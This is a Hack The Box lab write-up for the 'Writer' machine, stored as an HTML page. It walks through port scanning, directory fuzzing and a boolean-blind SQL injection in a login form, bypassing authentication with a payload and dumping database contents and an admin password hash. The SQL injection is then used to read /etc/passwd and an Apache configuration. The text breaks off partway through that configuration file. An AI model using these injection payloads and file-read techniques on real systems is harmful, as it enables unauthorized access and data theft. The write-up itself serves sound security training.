@@ -1,0 +1,969 @@
+<!doctype html><html lang=es>
+<head>
+<title>Writer | 7Rocky</title>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<meta name=viewport content="width=device-width,minimum-scale=1">
+<meta name=description content="Hack The Box. Linux. Medium machine. This machine contains a website that is vulnerable to SQL injection. This allows to read the source code of the server and find a vulnerability. Then some command injection techniques to escalate privileges. Some scripting for automating a SQLi exploit, SMB, SMTP and Cron tasks are needed to compromise the machine. This write-up uses custom Python scripts for SQLi and for the foothold">
+<meta name=robots content="index, follow">
+<meta name=image content="https://7rocky.github.io/images/HTB/Writer/Writer.png">
+<meta name=author content="7Rocky">
+<meta property="og:title" content="Writer">
+<meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine contains a website that is vulnerable to SQL injection. This allows to read the source code of the server and find a vulnerability. Then some command injection techniques to escalate privileges. Some scripting for automating a SQLi exploit, SMB, SMTP and Cron tasks are needed to compromise the machine. This write-up uses custom Python scripts for SQLi and for the foothold">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7rocky.github.io/en/htb/writer/"><meta property="article:section" content="htb">
+<meta property="article:published_time" content="2021-12-11T00:00:00+01:00">
+<meta property="article:modified_time" content="2021-12-11T00:00:00+01:00"><meta property="og:site_name" content="7Rocky">
+<meta property="og:image" content="https://7rocky.github.io/images/HTB/Writer/Writer.png">
+<meta property="og:author" content="7Rocky">
+<meta itemprop=name content="Writer">
+<meta itemprop=description content="Hack The Box. Linux. Medium machine. This machine contains a website that is vulnerable to SQL injection. This allows to read the source code of the server and find a vulnerability. Then some command injection techniques to escalate privileges. Some scripting for automating a SQLi exploit, SMB, SMTP and Cron tasks are needed to compromise the machine. This write-up uses custom Python scripts for SQLi and for the foothold"><meta itemprop=datePublished content="2021-12-11T00:00:00+01:00">
+<meta itemprop=dateModified content="2021-12-11T00:00:00+01:00">
+<meta itemprop=wordCount content="3705">
+<meta itemprop=keywords content="smb,flask,smtp,cronjob,sqli,password-reuse,file-permissions,command-injection,static-code-analysis,rce,hash-cracking,">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Writer">
+<meta name=twitter:description content="Hack The Box. Linux. Medium machine. This machine contains a website that is vulnerable to SQL injection. This allows to read the source code of the server and find a vulnerability. Then some command injection techniques to escalate privileges. Some scripting for automating a SQLi exploit, SMB, SMTP and Cron tasks are needed to compromise the machine. This write-up uses custom Python scripts for SQLi and for the foothold">
+<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Writer/Writer.png">
+<meta name=twitter:author content="7Rocky">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
+<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
+<link href=/css/style.css rel=stylesheet>
+<link href=/css/monokai-sublime.min.css rel=stylesheet>
+<link href=/css/main.css rel=stylesheet>
+<script src=/js/highlight.min.js></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
+<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
+<script src=/js/main.js></script>
+<div style=display:none>
+$
+\newcommand{\e}{e}
+\newcommand{\N}[1][]{\mathbb{N}^{#1}}
+\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
+\newcommand{\R}[1][]{\mathbb{R}^{#1}}
+\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
+\newcommand{\C}[1][]{\mathbb{C}^{#1}}
+\newcommand{\dx}{\,\mathrm{d}x}
+\newcommand{\dy}{\,\mathrm{d}y}
+\newcommand{\dz}{\,\mathrm{d}z}
+\newcommand{\dt}{\,\mathrm{d}t}
+\newcommand{\divides}{\, | \,}
+\newcommand{\st}{\; | \;}
+\renewcommand{\geq}{\geqslant}
+\renewcommand{\leq}{\leqslant}
+\renewcommand{\i}{\mathrm{i}}
+\newcommand{\rank}{\mathop{\mathrm{rank}}}
+\newcommand{\tr}{\mathop{\mathrm{tr}}}
+\newcommand{\charField}{\mathop{\mathrm{char}}}
+\newcommand{\Image}{\mathop{\mathrm{Im}}}
+$
+</div>
+</head>
+<body class="ma0 production">
+<header>
+<div class=bg-black>
+<nav class="pv3 ph3 ph4-ns" role=navigation>
+<div class="flex-l justify-between items-center center">
+<a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a>
+<div class="flex-l items-center">
+<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/htb/writer/ title=es>
+<img alt=es height=32px src=/images/es.png width=32px>
+</a>
+<ul class="pl0 ml3 mr3">
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a>
+</li>
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a>
+</li>
+</ul>
+<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+</div>
+</div>
+</nav>
+</div>
+</header>
+<main class=pb7 role=main>
+<article class="flex-l flex-wrap justify-between mw8 center ph3">
+<header class="mt4 w-100">
+<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside>
+<div id=sharing class=mt3>
+<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/writer/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
+</a>
+<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/writer/&text=Writer" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/writer/&title=Writer" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+</div>
+<h1 class="f1 mt3 mb1">Writer</h1>
+<time class="f6 mv4 dib tracked" datetime=2021-12-11T00:00:00+01:00>11 / 12 / 2021</time>
+</header>
+<div class=htb-image>
+<img alt=Writer src=/images/HTB/Writer/Writer.png>
+</div>
+<ul class="nested-links tags">
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/smb title=SMB>SMB</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/flask title=Flask>Flask</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/smtp title=SMTP>SMTP</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/cronjob title="Cron jobs">Cron jobs</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/sqli title="SQL Injection">SQL Injection</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/password-reuse title="Password reuse">Password reuse</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/file-permissions title="File permissions">File permissions</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/command-injection title="Command Injection">Command Injection</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/static-code-analysis title="Static Code Analysis">Static Code Analysis</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/rce title="Remote Code Execution">Remote Code Execution</a>
+</li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/hash-cracking title="Password hash cracking">Password hash cracking</a>
+</li>
+</ul>
+<aside aria-label=aside class="w-20-l mt6-l aside-mobile">
+<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
+<p class="f5 b mb3">Contents of this write-up</p>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#port-scanning>Port scanning</a></li>
+<li><a href=#web-enumeration>Web enumeration</a></li>
+<li><a href=#finding-a-sql-injection>Finding a SQL injection</a></li>
+<li><a href=#reading-files-using-sqli>Reading files using SQLi</a></li>
+<li><a href=#python-source-code-analysis>Python source code analysis</a></li>
+<li><a href=#smb-enumeration>SMB enumeration</a></li>
+<li><a href=#foothold-on-the-machine>Foothold on the machine</a></li>
+<li><a href=#system-enumeration>System enumeration</a></li>
+<li><a href=#lateral-movement-to-user-john>Lateral movement to user <code>john</code></a></li>
+<li><a href=#privilege-escalation>Privilege escalation</a></li>
+</ul>
+</nav>
+</div>
+</aside>
+<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
+<li>
+<strong>OS</strong>: Linux
+</li>
+<li>
+<strong>Difficulty</strong>: Medium
+</li>
+<li>
+<strong>IP Address</strong>: 10.10.11.101
+</li>
+<li>
+<strong>Release</strong>: 31 / 07 / 2021
+</li>
+</ul>
+<h2 id=port-scanning>Port scanning</h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext># Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.11.101 -p 22,80,139,445
+Nmap scan report for 10.10.11.101
+Host is up (0.050s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
+|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
+|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Story Bank | Writer.HTB
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: 13m06s
+|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date:
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done -- 1 IP address (1 host up) scanned in 14.60 seconds
+</code></pre></div><p>This machine has ports 22 (SSH), 80 (HTTP), 139 and 445 (SMB) open.</p>
+<h2 id=web-enumeration>Web enumeration</h2>
+<p>If we go to <code>http://10.10.11.101</code> we will see a blog like this:</p>
+<p><img src=/images/HTB/Writer/Writer-blog.png alt="Writer blog"></p>
+<p>The blog contains some posts, but nothing interesting at all. We can use <code>gobuster</code> to apply fuzzing and enumerate some routes:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -u http://10.10.11.101
+/contact              (Status: 200) [Size: 4905]
+/about                (Status: 200) [Size: 3522]
+/static               (Status: 301) [Size: 313] [--&gt; http://10.10.11.101/static/]
+/logout               (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]
+/dashboard            (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]
+/administrative       (Status: 200) [Size: 1443]
+/server-status        (Status: 403) [Size: 277]
+</code></pre></div><p>Here we can see a route called <code>/administrative</code>:</p>
+<p><img src=/images/HTB/Writer/Writer-administrative.png alt="Writer administrative"></p>
+<p>We can try some common default credentials (<code>admin:admin</code>, <code>root:password</code>, etc.), but none of them work.</p>
+<h2 id=finding-a-sql-injection>Finding a SQL injection</h2>
+<p>The login form seen at <code>/administrative</code> is vulnerable to SQL injection (SQLi). Using a simple SQLi payload (namely: <code>' or 1=1-- -</code>) we bypass authentication and enter the dashboard panel:</p>
+<p><img src=/images/HTB/Writer/Writer-dashboard.png alt="Writer dashboard"></p>
+<p>We can exploit SQLi to dump all the database contents. Notice that it is a Boolean-based blind SQLi (if the server responds with an error, then the SQL query has returned <code>false</code>; whereas if the server ends successfully, then the SQL query has returned <code>true</code>):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ curl 10.10.11.101/administrative -sd <span style=color:#e6db74>&#34;uname=&#39; or 1=2-- -&amp;password=x&#34;</span> | grep error
+        &lt;p class=&#34;error&#34; style=&#34;color:red&#34;&gt;&lt;strong style=&#34;color:red&#34;&gt;Error:&lt;/strong&gt; Incorrect credentials supplied &lt;/p&gt;
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>$ curl 10.10.11.101/administrative -sd <span style=color:#e6db74>&#34;uname=&#39; or 1=1-- -&amp;password=x&#34;</span> | grep error
+</code></pre></div><p>Using this fact, we can dump the contents of the database character by character, so that we iterate over the printable ASCII characters until we find the correct one for a given position of a given field. That&rsquo;s why it is recommended to use an automated script or a tool like <code>sqlmap</code> to extract all the data easily.</p>
+<p>Exploiting the SQLi with a custom Python script called <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer/sqli.py><code>sqli.py</code></a>, we can enumerate some fields of the tables of the database (detailed explanation <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer#sqlipy>here</a>).</p>
+<p>Here there are some contents in JSON format (table <code>stories</code> and columns <code>ganalitics</code> and <code>date_created</code> where excluded because they contain a lot of useless data):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 sqli.py
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-json data-lang=json>{
+  <span style=color:#f92672>&#34;writer&#34;</span>: {
+    <span style=color:#f92672>&#34;site&#34;</span>: {
+      <span style=color:#f92672>&#34;id&#34;</span>: [
+        <span style=color:#e6db74>&#34;1&#34;</span>
+      ],
+      <span style=color:#f92672>&#34;title&#34;</span>: [
+        <span style=color:#e6db74>&#34;Story Bank&#34;</span>
+      ],
+      <span style=color:#f92672>&#34;description&#34;</span>: [
+        <span style=color:#e6db74>&#34;This is a site where I publish my own and others stories&#34;</span>
+      ],
+      <span style=color:#f92672>&#34;logo&#34;</span>: [
+        <span style=color:#e6db74>&#34;/img/logo.png&#34;</span>
+      ],
+      <span style=color:#f92672>&#34;favicon&#34;</span>: [
+        <span style=color:#e6db74>&#34;/img/favicon.ico&#34;</span>
+      ],
+      <span style=color:#f92672>&#34;ganalytics&#34;</span>: []
+    },
+    <span style=color:#f92672>&#34;stories&#34;</span>: {},
+    <span style=color:#f92672>&#34;users&#34;</span>: {
+      <span style=color:#f92672>&#34;id&#34;</span>: [
+        <span style=color:#e6db74>&#34;1&#34;</span>
+      ],
+      <span style=color:#f92672>&#34;username&#34;</span>: [
+        <span style=color:#e6db74>&#34;admin&#34;</span>
+      ],
+      <span style=color:#f92672>&#34;password&#34;</span>: [
+        <span style=color:#e6db74>&#34;118e48794631a9612484ca8b55f622d0&#34;</span>
+      ],
+      <span style=color:#f92672>&#34;email&#34;</span>: [
+        <span style=color:#e6db74>&#34;admin@writer.htb&#34;</span>
+      ],
+      <span style=color:#f92672>&#34;status&#34;</span>: [
+        <span style=color:#e6db74>&#34;Active&#34;</span>
+      ],
+      <span style=color:#f92672>&#34;date_created&#34;</span>: []
+    }
+  }
+}
+</code></pre></div><p>There is a hashed password, but it is not crackable with <code>john</code> or <code>hashcat</code>.</p>
+<h2 id=reading-files-using-sqli>Reading files using SQLi</h2>
+<p>If we check for the granted privileges on the database, we see that we are able to read files and write files (privilege called <code>FILE</code>) if we have the right permissions from the file system:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 sqli.py privileges
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-json data-lang=json>{
+  <span style=color:#f92672>&#34;grantee&#34;</span>: [
+    <span style=color:#e6db74>&#34;&#39;admin&#39;@&#39;localhost&#39;&#34;</span>
+  ],
+  <span style=color:#f92672>&#34;privilege_type&#34;</span>: [
+    <span style=color:#e6db74>&#34;FILE&#34;</span>
+  ],
+  <span style=color:#f92672>&#34;table_catalog&#34;</span>: [
+    <span style=color:#e6db74>&#34;def&#34;</span>
+  ],
+  <span style=color:#f92672>&#34;is_grantable&#34;</span>: [
+    <span style=color:#e6db74>&#34;NO&#34;</span>
+  ]
+}
+</code></pre></div><p>As a proof of concept, we can read <code>/etc/passwd</code>. This tells us that there are two low-privileged users: <code>kyle</code> and <code>john</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 sqli.py /etc/passwd
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
+filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
+john:x:1001:1001:,,,:/home/john:/bin/bash
+mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre></div><p>We could continue enumerating files from the server. It would be nice if we could read the source code of the back-end. For that, we can search for the server configuration (usually an Apache or nginx server is running).</p>
+<p>Actually, the file <code>/etc/apache2/sites-available/000-default.conf</code> exists, and here it is:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 sqli.py /etc/apache2/sites-available/000-default.conf
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-apache data-lang=apache><span style=color:#75715e># Virtual host configuration for writer.htb domain</span>
+<span style=color:#f92672>&lt;VirtualHost</span> <span style=color:#e6db74>*:80</span><span style=color:#f92672>&gt;</span>
+        ServerName writer.htb
+        ServerAdmin admin@writer.htb
+        WSGIScriptAlias / <span style=color:#e6db74>/var/www/writer.htb/writer.wsgi</span>
+        <span style=color:#f92672>&lt;Directory</span> <span style=color:#e6db74>/var/www/writer.htb</span><span style=color:#f92672>&gt;</span>
+                Order allow,deny
+                Allow from <span style=color:#66d9ef>all</span>
+        <span style=color:#f92672>&lt;/Directory&gt;</span>
+        Alias <span style=color:#e6db74>/static</span> <span style=color:#e6db74>/var/www/writer.htb/writer/static</span>
+        <span style=color:#f92672>&lt;Directory</span> <span style=color:#e6db74>/var/www/writer.htb/writer/static/</span><span style=color:#f92672>&gt;</span>
+                Order allow,deny
+                Allow from <span style=color:#66d9ef>all</span>
+        <span style=color:#f92672>&lt;/Directory&gt;</span>
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        LogLevel <span style=color:#66d9ef>warn</span>
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+<span style=color:#f92672>&lt;/VirtualHost&gt;</span>
+
+<span style=color:#75715e># Virtual host configuration for dev.writer.htb subdomain</span>
+<span style=color:#75715e># Will enable configuration after completing backend development</span>
+<span style=color:#75715e># Listen 8080</span>
+<span style=color:#75715e>#&lt;VirtualHost 127.0.0.1:8080&gt;</span>
+<span style=color:#75715e>#       ServerName dev.writer.htb</span>
+<span style=color:#75715e>#       ServerAdmin admin@writer.htb</span>
+<span style=color:#75715e>#</span>
+        <span style=color:#75715e># Collect static for the writer2_project/writer_web/templates</span>
